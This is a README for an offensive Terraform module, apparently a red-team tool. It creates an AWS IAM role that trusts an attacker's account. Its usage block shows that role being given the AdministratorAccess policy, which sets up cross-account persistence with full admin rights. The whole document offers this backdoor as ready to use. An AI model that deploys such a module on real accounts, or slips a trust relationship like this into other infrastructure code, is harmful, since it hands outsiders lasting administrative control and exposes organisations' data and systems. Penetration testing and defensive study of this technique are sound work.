# AWS Cross Account Persistence

![OffensiveTerraform](https://img.shields.io/badge/hack-success)
![OffensiveTerraform](https://img.shields.io/badge/offensive-terraform-blueviolet)
![OffensiveTerraform](https://img.shields.io/badge/aws-important)

Offensive Terraform module which creates an IAM role with trust relationship with attacker's AWS account and attaches managed IAM Policy to an IAM role.

![Attack Diagram](https://raw.githubusercontent.com/offensive-terraform/terraform-aws-cross-account-persistence/master/diagram.jpg)

## Usage
```
module "cross-account-persistence" {
  source  = "offensive-terraform/cross-account-persistence/aws"

  role_name           = "hack-the-planet"
  policy_arn          = "arn:aws:iam::aws:policy/AdministratorAccess"
  attacker_account_id = "000000000000"
}

output "role_arn" {
  value = module.cross-account-persistence.role_arn
}
```
## Author
Module managed by https://github.com/iganbold
